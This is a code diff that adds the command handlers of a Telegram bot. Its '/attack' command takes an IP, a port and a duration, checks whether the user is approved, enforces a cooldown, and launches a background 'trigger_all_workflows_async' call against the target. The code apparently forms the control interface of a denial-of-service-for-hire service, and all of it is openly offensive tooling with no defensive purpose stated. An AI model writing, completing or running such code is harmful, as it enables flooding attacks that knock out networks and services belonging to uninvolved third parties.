@@ -1,0 +1,57 @@
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global is_attack_running, attack_end_time, current_target
+    
+    # 1. Check Approval
+    if not is_approved(update.effective_user.id):
+        await update.message.reply_text("❌ Not approved.")
+        return
+    
+    # 2. Check Cooldown (Non-blocking)
+    now = time.time()
+    if is_attack_running and now < attack_end_time:
+        remaining_time = int(attack_end_time - now)
+        await update.message.reply_text(f"⚠️ BOT BUSY\n⏳ Cooldown: {remaining_time}s\n🎯 Target: {current_target}")
+        return
+        
+    # 3. Validate Arguments
+    if len(context.args) != 3:
+        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
+        return
+
+    try:
+        ip = context.args[0]
+        port = context.args[1]
+        time_int = int(context.args[2])
+        
+        if not (1 <= time_int <= 300):
+            await update.message.reply_text("❌ Time: 1-300 seconds")
+            return
+            
+    except ValueError:
+        await update.message.reply_text("❌ Invalid input.")
+        return
+
+    # 4. Set Global State
+    is_attack_running = True
+    attack_end_time = time.time() + time_int
+    current_target = f"{ip}:{port}"
+    
+    await update.message.reply_text(f"🚀 ATTACK DISPATCHED\n🎯 Target: {ip}:{port}\n⏰ Duration: {time_int}s")
+    
+    # 5. Run execution in background task
+    asyncio.create_task(execute_attack(update, ip, port, time_int))
+
+async def execute_attack(update, ip, port, duration):
+    global is_attack_running, current_target
+    try:
+        # Trigger the API call
+        await trigger_all_workflows_async(ip, port, duration)
+        # Wait for the attack duration
+        await asyncio.sleep(duration)
+        await update.message.reply_text(f"✅ ATTACK COMPLETED\n🎯 Target: {ip}:{port}")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
+    finally:
+        # Reset state so the next person can use it
+        is_attack_running = False
+        current_target = ""
